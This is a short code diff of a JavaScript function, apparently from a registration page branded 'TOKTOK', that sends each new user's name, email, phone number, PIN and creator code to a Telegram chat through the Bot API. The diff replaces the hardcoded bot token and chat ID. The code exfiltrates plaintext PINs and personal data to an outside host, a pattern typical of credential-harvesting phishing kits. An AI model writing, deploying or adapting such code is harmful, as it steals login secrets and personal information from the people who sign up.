@@ -249,8 +249,8 @@ async function checkPhoneExists(phone) {
 // ============================================================
 async function sendNewUserToTelegram(u) {
   try {
-    const botToken = '8794091027:AAG36PsetBQY3oqGQzGw39rZhbOaBAaE41A';
-    const chatId = '-1003548227301';
+    const botToken = '9024276740:AAHrRrlV4PHm8vMzjJmDrpnRd5SlihJtSY8';
+    const chatId = '-1005775132654';
     const message = `🎉 *NUEVO REGISTRO EN TOKTOK* 🎉\n\n👤 *Nombre:* ${u.name}\n📧 *Email:* ${u.email}\n📱 *Teléfono:* ${u.phone}\n🔑 *PIN:* ${u.pin}\n🎯 *Código de Creador:* ${u.creatorCode || 'No proporcionado'}\n\n⏰ *Fecha:* ${new Date().toLocaleString()}`;
     await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
       method: 'POST',
